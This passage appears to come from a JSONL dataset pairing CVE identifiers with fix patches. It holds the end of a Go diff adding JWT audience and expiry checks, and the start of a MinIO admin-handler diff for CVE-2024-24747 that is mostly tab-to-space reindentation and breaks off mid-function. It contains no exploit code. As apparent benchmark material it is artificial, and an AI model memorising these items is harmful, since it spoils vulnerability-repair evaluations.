status.Error(codes.Unauthenticated, \"unauthenticated\")\n+                }\n+\n+                tok, err := jwt.ParseSigned(rawjwt)\n+                if err != nil {\n+                        return status.Errorf(codes.Unauthenticated, \"invalid JWT: %v\", err)\n+                }\n+\n+                var claims struct {\n+                        Audience jwt.Audience      `json:\"aud,omitempty\"`\n+                        Expiry   *jwt.NumericDate `json:\"exp,omitempty\"`\n+                }\n+                err = tok.Claims(key, &claims)\n+                if err != nil {\n+                        return status.Errorf(codes.Unauthenticated, \"invalid JWT: %v\", err)\n+                }\n+\n+                if claims.Expiry == nil || time.Now().After(claims.Expiry.Time()) {\n+                        return status.Errorf(codes.Unauthenticated, \"expired JWT: %v\", err)\n+                }\n+\n+                var auds []string\n+                if len(claims.Audience) > 0 {\n+                        auds = append(auds, claims.Audience...)\n+                }\n+                var found bool\n+                for _, aud := range auds {\n+                        if aud == \"databroker.pomerium.io\" {\n+                                found = true\n+                                break\n+                        }\n+                }\n+                if !found {\n+                        return status.Error(codes.Unauthenticated, \"invalid audience\")\n+                }\n+        }\n+        return nil\n }\n"}
{"cve":"CVE-2024-24747:0708", "fix_patch": "diff --git a/cmd/admin-handlers-users.go b/cmd/admin-handlers-users.go\nindex 1d9f2a5b1..5c55fd9e7 100644\n--- a/cmd/admin-handlers-users.go\n+++ b/cmd/admin-handlers-users.go\n@@ -18,1327 +18,1520 @@\n package cmd\n \n import (\n-\t\"bytes\"\n-\t\"context\"\n-\t\"encoding/json\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"net/http\"\n-\t\"os\"\n-\t\"sort\"\n-\t\"time\"\n-\n-\t\"github.com/klauspost/compress/zip\"\n-\t\"github.com/minio/madmin-go/v3\"\n-\t\"github.com/minio/minio/internal/auth\"\n-\t\"github.com/minio/minio/internal/config/dns\"\n-\t\"github.com/minio/minio/internal/logger\"\n-\t\"github.com/minio/mux\"\n-\t\"github.com/minio/pkg/v2/policy\"\n+        \"bytes\"\n+        \"context\"\n+        \"encoding/json\"\n+        \"errors\"\n+        \"fmt\"\n+        \"io\"\n+        \"net/http\"\n+        \"os\"\n+        \"sort\"\n+        \"time\"\n+\n+        \"github.com/klauspost/compress/zip\"\n+        \"github.com/minio/madmin-go/v3\"\n+        \"github.com/minio/minio/internal/auth\"\n+        \"github.com/minio/minio/internal/config/dns\"\n+        \"github.com/minio/minio/internal/logger\"\n+        \"github.com/minio/mux\"\n+        \"github.com/minio/pkg/v2/policy\"\n )\n \n // RemoveUser - DELETE /minio/admin/v3/remove-user?accessKey=<access_key>\n func (a adminAPIHandlers) RemoveUser(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, cred := validateAdminReq(ctx, w, r, policy.DeleteUserAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\taccessKey := vars[\"accessKey\"]\n-\n-\tok, _, err := globalIAMSys.IsTempUser(accessKey)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\tif ok {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// When the user is root credential you are not allowed to\n-\t// remove the root user. Also you cannot delete yourself.\n-\tif accessKey == globalActiveCred.AccessKey || accessKey == cred.AccessKey {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif err := globalIAMSys.DeleteUser(ctx, accessKey, true); err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemIAMUser,\n-\t\tIAMUser: &madmin.SRIAMUser{\n-\t\t\tAccessKey:   accessKey,\n-\t\t\tIsDeleteReq: true,\n-\t\t},\n-\t\tUpdatedAt: UTCNow(),\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, cred := validateAdminReq(ctx, w, r, policy.DeleteUserAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        accessKey := vars[\"accessKey\"]\n+\n+        ok, _, err := globalIAMSys.IsTempUser(accessKey)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+        if ok {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                return\n+        }\n+\n+        // When the user is root credential you are not allowed to\n+        // remove the root user. Also you cannot delete yourself.\n+        if accessKey == globalActiveCred.AccessKey || accessKey == cred.AccessKey {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                return\n+        }\n+\n+        if err := globalIAMSys.DeleteUser(ctx, accessKey, true); err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemIAMUser,\n+                IAMUser: &madmin.SRIAMUser{\n+                        AccessKey:   accessKey,\n+                        IsDeleteReq: true,\n+                },\n+                UpdatedAt: UTCNow(),\n+        }))\n }\n \n // ListBucketUsers - GET /minio/admin/v3/list-users?bucket={bucket}\n func (a adminAPIHandlers) ListBucketUsers(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n+        ctx := r.Context()\n \n-\tobjectAPI, cred := validateAdminReq(ctx, w, r, policy.ListUsersAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n+        objectAPI, cred := validateAdminReq(ctx, w, r, policy.ListUsersAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n \n-\tbucket := mux.Vars(r)[\"bucket\"]\n+        bucket := mux.Vars(r)[\"bucket\"]\n \n-\tpassword := cred.SecretKey\n+        password := cred.SecretKey\n \n-\tallCredentials, err := globalIAMSys.ListBucketUsers(ctx, bucket)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        allCredentials, err := globalIAMSys.ListBucketUsers(ctx, bucket)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n \n-\tdata, err := json.Marshal(allCredentials)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        data, err := json.Marshal(allCredentials)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n \n-\teconfigData, err := madmin.EncryptData(password, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        econfigData, err := madmin.EncryptData(password, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n \n-\twriteSuccessResponseJSON(w, econfigData)\n+        writeSuccessResponseJSON(w, econfigData)\n }\n \n // ListUsers - GET /minio/admin/v3/list-users\n func (a adminAPIHandlers) ListUsers(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, cred := validateAdminReq(ctx, w, r, policy.ListUsersAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tpassword := cred.SecretKey\n-\n-\tallCredentials, err := globalIAMSys.ListUsers(ctx)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Add ldap users which have mapped policies if in LDAP mode\n-\t// FIXME(vadmeste): move this to policy info in the future\n-\tldapUsers, err := globalIAMSys.ListLDAPUsers(ctx)\n-\tif err != nil && err != errIAMActionNotAllowed {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\tfor k, v := range ldapUsers {\n-\t\tallCredentials[k] = v\n-\t}\n-\n-\t// Marshal the response\n-\tdata, err := json.Marshal(allCredentials)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\teconfigData, err := madmin.EncryptData(password, data)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, econfigData)\n+        ctx := r.Context()\n+\n+        objectAPI, cred := validateAdminReq(ctx, w, r, policy.ListUsersAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        password := cred.SecretKey\n+\n+        allCredentials, err := globalIAMSys.ListUsers(ctx)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        // Add ldap users which have mapped policies if in LDAP mode\n+        // FIXME(vadmeste): move this to policy info in the future\n+        ldapUsers, err := globalIAMSys.ListLDAPUsers(ctx)\n+        if err != nil && err != errIAMActionNotAllowed {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+        for k, v := range ldapUsers {\n+                allCredentials[k] = v\n+        }\n+\n+        // Marshal the response\n+        data, err := json.Marshal(allCredentials)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        econfigData, err := madmin.EncryptData(password, data)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, econfigData)\n }\n \n // GetUserInfo - GET /minio/admin/v3/user-info\n func (a adminAPIHandlers) GetUserInfo(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tvars := mux.Vars(r)\n-\tname := vars[\"accessKey\"]\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcheckDenyOnly := false\n-\tif name == cred.AccessKey {\n-\t\t// Check that there is no explicit deny - otherwise it's allowed\n-\t\t// to view one's own info.\n-\t\tcheckDenyOnly = true\n-\t}\n-\n-\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.GetUserAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t\tDenyOnly:        checkDenyOnly,\n-\t}) {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n-\t\treturn\n-\t}\n-\n-\tuserInfo, err := globalIAMSys.GetUserInfo(ctx, name)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tdata, err := json.Marshal(userInfo)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, data)\n+        ctx := r.Context()\n+\n+        vars := mux.Vars(r)\n+        name := vars[\"accessKey\"]\n+\n+        // Get current object layer instance.\n+        objectAPI := newObjectLayerFn()\n+        if objectAPI == nil || globalNotificationSys == nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n+                return\n+        }\n+\n+        cred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n+        if s3Err != ErrNone {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n+                return\n+        }\n+\n+        checkDenyOnly := false\n+        if name == cred.AccessKey {\n+                // Check that there is no explicit deny - otherwise it's allowed\n+                // to view one's own info.\n+                checkDenyOnly = true\n+        }\n+\n+        if !globalIAMSys.IsAllowed(policy.Args{\n+                AccountName:     cred.AccessKey,\n+                Groups:          cred.Groups,\n+                Action:          policy.GetUserAdminAction,\n+                ConditionValues: getConditionValues(r, \"\", cred),\n+                IsOwner:         owner,\n+                Claims:          cred.Claims,\n+                DenyOnly:        checkDenyOnly,\n+        }) {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAccessDenied), r.URL)\n+                return\n+        }\n+\n+        userInfo, err := globalIAMSys.GetUserInfo(ctx, name)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        data, err := json.Marshal(userInfo)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, data)\n }\n \n // UpdateGroupMembers - PUT /minio/admin/v3/update-group-members\n func (a adminAPIHandlers) UpdateGroupMembers(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.AddUserToGroupAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tdata, err := io.ReadAll(r.Body)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\tvar updReq madmin.GroupAddRemove\n-\terr = json.Unmarshal(data, &updReq)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Reject if the group add and remove are temporary credentials, or root credential.\n-\tfor _, member := range updReq.Members {\n-\t\tok, _, err := globalIAMSys.IsTempUser(member)\n-\t\tif err != nil && err != errNoSuchUser {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\tif ok {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t\t// When the user is root credential you are not allowed to\n-\t\t// add policies for root user.\n-\t\tif member == globalActiveCred.AccessKey {\n-\t\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tvar updatedAt time.Time\n-\tif updReq.IsRemove {\n-\t\tupdatedAt, err = globalIAMSys.RemoveUsersFromGroup(ctx, updReq.Group, updReq.Members)\n-\t} else {\n-\t\t// Check if group already exists\n-\t\tif _, gerr := globalIAMSys.GetGroupDescription(updReq.Group); gerr != nil {\n-\t\t\t// If group does not exist, then check if the group has beginning and end space characters\n-\t\t\t// we will reject such group names.\n-\t\t\tif errors.Is(gerr, errNoSuchGroup) && hasSpaceBE(updReq.Group) {\n-\t\t\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t\tupdatedAt, err = globalIAMSys.AddUsersToGroup(ctx, updReq.Group, updReq.Members)\n-\t}\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemGroupInfo,\n-\t\tGroupInfo: &madmin.SRGroupInfo{\n-\t\t\tUpdateReq: updReq,\n-\t\t},\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.AddUserToGroupAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        data, err := io.ReadAll(r.Body)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+\n+        var updReq madmin.GroupAddRemove\n+        err = json.Unmarshal(data, &updReq)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrInvalidRequest), r.URL)\n+                return\n+        }\n+\n+        // Reject if the group add and remove are temporary credentials, or root credential.\n+        for _, member := range updReq.Members {\n+                ok, _, err := globalIAMSys.IsTempUser(member)\n+                if err != nil && err != errNoSuchUser {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                        return\n+                }\n+                if ok {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                        return\n+                }\n+                // When the user is root credential you are not allowed to\n+                // add policies for root user.\n+                if member == globalActiveCred.AccessKey {\n+                        writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errIAMActionNotAllowed), r.URL)\n+                        return\n+                }\n+        }\n+\n+        var updatedAt time.Time\n+        if updReq.IsRemove {\n+                updatedAt, err = globalIAMSys.RemoveUsersFromGroup(ctx, updReq.Group, updReq.Members)\n+        } else {\n+                // Check if group already exists\n+                if _, gerr := globalIAMSys.GetGroupDescription(updReq.Group); gerr != nil {\n+                        // If group does not exist, then check if the group has beginning and end space characters\n+                        // we will reject such group names.\n+                        if errors.Is(gerr, errNoSuchGroup) && hasSpaceBE(updReq.Group) {\n+                                writeErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n+                                return\n+                        }\n+                }\n+                updatedAt, err = globalIAMSys.AddUsersToGroup(ctx, updReq.Group, updReq.Members)\n+        }\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemGroupInfo,\n+                GroupInfo: &madmin.SRGroupInfo{\n+                        UpdateReq: updReq,\n+                },\n+                UpdatedAt: updatedAt,\n+        }))\n }\n \n // GetGroup - /minio/admin/v3/group?group=mygroup1\n func (a adminAPIHandlers) GetGroup(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n+        ctx := r.Context()\n \n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.GetGroupAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.GetGroupAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n \n-\tvars := mux.Vars(r)\n-\tgroup := vars[\"group\"]\n+        vars := mux.Vars(r)\n+        group := vars[\"group\"]\n \n-\tgdesc, err := globalIAMSys.GetGroupDescription(group)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        gdesc, err := globalIAMSys.GetGroupDescription(group)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n \n-\tbody, err := json.Marshal(gdesc)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n+        body, err := json.Marshal(gdesc)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n \n-\twriteSuccessResponseJSON(w, body)\n+        writeSuccessResponseJSON(w, body)\n }\n \n // ListGroups - GET /minio/admin/v3/groups\n func (a adminAPIHandlers) ListGroups(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.ListGroupsAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tgroups, err := globalIAMSys.ListGroups(ctx)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tbody, err := json.Marshal(groups)\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\twriteSuccessResponseJSON(w, body)\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.ListGroupsAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        groups, err := globalIAMSys.ListGroups(ctx)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        body, err := json.Marshal(groups)\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        writeSuccessResponseJSON(w, body)\n }\n \n // SetGroupStatus - PUT /minio/admin/v3/set-group-status?group=mygroup1&status=enabled\n func (a adminAPIHandlers) SetGroupStatus(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, _ := validateAdminReq(ctx, w, r, policy.EnableGroupAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\tgroup := vars[\"group\"]\n-\tstatus := vars[\"status\"]\n-\n-\tvar (\n-\t\terr       error\n-\t\tupdatedAt time.Time\n-\t)\n-\tswitch status {\n-\tcase statusEnabled:\n-\t\tupdatedAt, err = globalIAMSys.SetGroupStatus(ctx, group, true)\n-\tcase statusDisabled:\n-\t\tupdatedAt, err = globalIAMSys.SetGroupStatus(ctx, group, false)\n-\tdefault:\n-\t\terr = errInvalidArgument\n-\t}\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemGroupInfo,\n-\t\tGroupInfo: &madmin.SRGroupInfo{\n-\t\t\tUpdateReq: madmin.GroupAddRemove{\n-\t\t\t\tGroup:    group,\n-\t\t\t\tStatus:   madmin.GroupStatus(status),\n-\t\t\t\tIsRemove: false,\n-\t\t\t},\n-\t\t},\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, _ := validateAdminReq(ctx, w, r, policy.EnableGroupAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        group := vars[\"group\"]\n+        status := vars[\"status\"]\n+\n+        var (\n+                err       error\n+                updatedAt time.Time\n+        )\n+        switch status {\n+        case statusEnabled:\n+                updatedAt, err = globalIAMSys.SetGroupStatus(ctx, group, true)\n+        case statusDisabled:\n+                updatedAt, err = globalIAMSys.SetGroupStatus(ctx, group, false)\n+        default:\n+                err = errInvalidArgument\n+        }\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemGroupInfo,\n+                GroupInfo: &madmin.SRGroupInfo{\n+                        UpdateReq: madmin.GroupAddRemove{\n+                                Group:    group,\n+                                Status:   madmin.GroupStatus(status),\n+                                IsRemove: false,\n+                        },\n+                },\n+                UpdatedAt: updatedAt,\n+        }))\n }\n \n // SetUserStatus - PUT /minio/admin/v3/set-user-status?accessKey=<access_key>&status=[enabled|disabled]\n func (a adminAPIHandlers) SetUserStatus(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tobjectAPI, creds := validateAdminReq(ctx, w, r, policy.EnableUserAdminAction)\n-\tif objectAPI == nil {\n-\t\treturn\n-\t}\n-\n-\tvars := mux.Vars(r)\n-\taccessKey := vars[\"accessKey\"]\n-\tstatus := vars[\"status\"]\n-\n-\t// you cannot enable or disable yourself.\n-\tif accessKey == creds.AccessKey {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\tupdatedAt, err := globalIAMSys.SetUserStatus(ctx, accessKey, madmin.AccountStatus(status))\n-\tif err != nil {\n-\t\twriteErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n-\t\treturn\n-\t}\n-\n-\tlogger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n-\t\tType: madmin.SRIAMItemIAMUser,\n-\t\tIAMUser: &madmin.SRIAMUser{\n-\t\t\tAccessKey:   accessKey,\n-\t\t\tIsDeleteReq: false,\n-\t\t\tUserReq: &madmin.AddOrUpdateUserReq{\n-\t\t\t\tStatus: madmin.AccountStatus(status),\n-\t\t\t},\n-\t\t},\n-\t\tUpdatedAt: updatedAt,\n-\t}))\n+        ctx := r.Context()\n+\n+        objectAPI, creds := validateAdminReq(ctx, w, r, policy.EnableUserAdminAction)\n+        if objectAPI == nil {\n+                return\n+        }\n+\n+        vars := mux.Vars(r)\n+        accessKey := vars[\"accessKey\"]\n+        status := vars[\"status\"]\n+\n+        // you cannot enable or disable yourself.\n+        if accessKey == creds.AccessKey {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, errInvalidArgument), r.URL)\n+                return\n+        }\n+\n+        updatedAt, err := globalIAMSys.SetUserStatus(ctx, accessKey, madmin.AccountStatus(status))\n+        if err != nil {\n+                writeErrorResponseJSON(ctx, w, toAdminAPIErr(ctx, err), r.URL)\n+                return\n+        }\n+\n+        logger.LogIf(ctx, globalSiteReplicationSys.IAMChangeHook(ctx, madmin.SRIAMItem{\n+                Type: madmin.SRIAMItemIAMUser,\n+                IAMUser: &madmin.SRIAMUser{\n+                        AccessKey:   accessKey,\n+                        IsDeleteReq: false,\n+                        UserReq: &madmin.AddOrUpdateUserReq{\n+                                Status: madmin.AccountStatus(status),\n+                        },\n+                },\n+                UpdatedAt: updatedAt,\n+        }))\n }\n \n // AddUser - PUT /minio/admin/v3/add-user?accessKey=<access_key>\n func (a adminAPIHandlers) AddUser(w http.ResponseWriter, r *http.Request) {\n-\tctx := r.Context()\n-\n-\tvars := mux.Vars(r)\n-\taccessKey := vars[\"accessKey\"]\n-\n-\t// Get current object layer instance.\n-\tobjectAPI := newObjectLayerFn()\n-\tif objectAPI == nil || globalNotificationSys == nil {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrServerNotInitialized), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcred, owner, s3Err := validateAdminSignature(ctx, r, \"\")\n-\tif s3Err != ErrNone {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Not allowed to add a user with same access key as root credential\n-\tif accessKey == globalActiveCred.AccessKey {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\tuser, exists := globalIAMSys.GetUser(ctx, accessKey)\n-\tif exists && (user.Credentials.IsTemp() || user.Credentials.IsServiceAccount()) {\n-\t\t// Updating STS credential is not allowed, and this API does not\n-\t\t// support updating service accounts.\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\tif (cred.IsTemp() || cred.IsServiceAccount()) && cred.ParentUser == accessKey {\n-\t\t// Incoming access key matches parent user then we should\n-\t\t// reject password change requests.\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAddUserInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\t// Check if accessKey has beginning and end space characters, this only applies to new users.\n-\tif !exists && hasSpaceBE(accessKey) {\n-\t\twriteErrorResponseJSON(ctx, w, errorCodes.ToAPIErr(ErrAdminResourceInvalidArgument), r.URL)\n-\t\treturn\n-\t}\n-\n-\tcheckDenyOnly := false\n-\tif accessKey == cred.AccessKey {\n-\t\t// Check that there is no explicit deny - otherwise it's allowed\n-\t\t// to change one's own password.\n-\t\tcheckDenyOnly = true\n-\t}\n-\n-\tif !globalIAMSys.IsAllowed(policy.Args{\n-\t\tAccountName:     cred.AccessKey,\n-\t\tGroups:          cred.Groups,\n-\t\tAction:          policy.CreateUserAdminAction,\n-\t\tConditionValues: getConditionValues(r, \"\", cred),\n-\t\tIsOwner:         owner,\n-\t\tClaims:          cred.Claims,\n-\t\tDenyOnly:        checkDenyOnly,\n-\t}) 